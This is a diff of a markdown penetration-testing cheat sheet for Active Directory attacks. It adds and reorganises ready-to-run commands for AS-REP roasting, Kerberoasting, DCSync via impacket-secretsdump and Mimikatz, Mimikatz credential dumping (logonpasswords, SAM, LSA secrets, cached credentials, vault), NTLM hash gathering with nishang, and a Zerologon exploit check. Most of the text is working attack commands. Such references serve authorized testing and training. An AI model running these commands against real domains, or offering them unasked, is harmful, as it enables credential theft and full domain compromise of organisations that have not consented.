@@ -20,11 +20,6 @@ Powershell:
 Domain()
 ```
 
-###### Responder
-```
-> responder -I eth0 -rdw
-```
-
 ###### Bloodhound
 ```
 Bloodhound documentation:
@@ -67,10 +62,10 @@ https://github.com/ropnop/kerbrute
 
 ###### Kerberos ~ AS-REP Roasting
 ```
-From external:
+From external with Impacket:
 > impacket-GetNPUsers domain.local/ -format john -usersfile wordlist -no-pass -dc-ip 10.10.10.10
 
-From internal:
+With Rubeus:
 https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
 
 Password dictionary attack:
@@ -81,10 +76,10 @@ or:
 
 ###### Kerberos ~ Kerberoasting
 ```
-From external:
+From external with Impacket:
 > GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/username -save -outputfile tgsfile.out
 
-From internal:
+With Rubeus:
 https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
 
 
@@ -95,18 +90,17 @@ or:
 ```
 
 
-##### DS-SYNC attack
+###### DC-SYNC attack
 ```
-with impacket-secretsdump:
+From external with impacket-secretsdump:
 > impacket-secretsdump domain/username@10.10.10.10
 > impacket-secretsdump domain/username@10.10.10.10 -just-dc
 > impacket-secretsdump domain/username:password@10.10.10.10
 
-with mimikatz:
+with Mimikatz:
 > Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
 > lsadump::dcsync /domain:domain.local /user:Administrator
 ```
-
 
 
 ###### Pass The Hash with CrackMapExec
@@ -131,20 +125,52 @@ https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
 ```
 
 
-
-###### Mimikatz
+###### Mimikatz ~ Retrieve stored credentials
 ```
+The powershell module:
+https://github.com/samratashok/nishang/tree/master/Gather
+
+the EXE variant:
+https://github.com/gentilkiwi/mimikatz
+cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
+
 > .\mimikatz.exe
-Then:
 > privilege::debug
+> token::elevate
+> log file.out
+
+sekurlsa
 > sekurlsa::logonpasswords
 > sekurlsa::tickets
-> kerberos::list /export
-> sekurlsa::logonpasswords
+
+kerberos
+> kerberos::list
+
+vault
+> vault::cred
+> vault::list
+
+lsadump
+> lsadump::sam
+> lsadump::secrets
+> lsadump::cache
+> token::revert
+
 > sekurlsa::pth /user:some_admin /domain:domain.com /ntlm:hAsHPaRt2 /run:PowerShell.exe
 ```
 
-###### Hashdump (manual)
+###### Retrieve stored credentials (manual)
+```
+view stored kerberos tickets:
+> klist
+
+https://github.com/samratashok/nishang/tree/master/Gather
+gather NTLM hashes with nishang script:
+> Import-Module .\Get-PassHashes.ps1
+> Get-PassHashes
+```
+
+###### SAM Hashdump (manual)
 ```
 Dumping SAM hashes from CMD:
 https://miloserdov.org/?p=4129
@@ -155,21 +181,10 @@ https://miloserdov.org/?p=4129
 Location:
 C:/Windows/System32/config/SAM
 C:/Windows/System32/config/SYSTEM
-
 ```
 
-
-###### Zerologon (probably going to break the domain...)
+###### Zerologon (probably going to break the domain, not recommended..)
 ```
 > searchsploit -m 49871.py
 > python3 49871.py -do check -target NETBIOSNAME -ip 10.10.10.10
-```
-
-
-###### HiveNightmare
-```
-https://github.com/GossiTheDog/HiveNightmare
-
-Works on all supported versions of Windows 10, where System Protection is enabled (should be enabled by default in most configurations).
-Check for vuln by checking if the patch for CVE-2021–36934 is installed, and by checking if system protection is enabled (with rstrui.exe ?)
 ```
